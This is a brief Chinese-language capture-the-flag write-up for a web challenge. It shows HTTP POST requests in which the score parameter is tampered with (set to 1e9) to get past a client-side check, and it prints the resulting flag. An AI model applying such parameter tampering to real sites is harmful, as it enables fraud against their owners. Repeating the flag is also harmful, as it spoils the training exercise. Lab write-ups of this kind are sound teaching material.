使用首页分数表单
- 仅点击按钮
    ```http
    POST /web-serveur/ch56/ HTTP/1.1

    score=875594&generate=Give+a+try%21
    ```
    - 响应
        ```html
        <p>
            Hoo tooooo sad, you lost. Your score: <strong>
                875594
            </strong>
            ! I'm always the best :)
        </p>
        ```
- 修改分数
    ```http
    POST /web-serveur/ch56/ HTTP/1.1

    score=1e9&generate=Give+a+try%21
    ```
    - 响应
        ```html
        <p>
            Wow, 1e9! How did you do that? :o
        </p>
        <p>
            Flag to validate the challenge: <strong>
                H7tp_h4s_N0_s3Cr37S_F0r_y0U
            </strong>
        </p>
        ```

- 额外测试：若删除 `generate` 参数，则无效。似乎作为客户端计算的验证
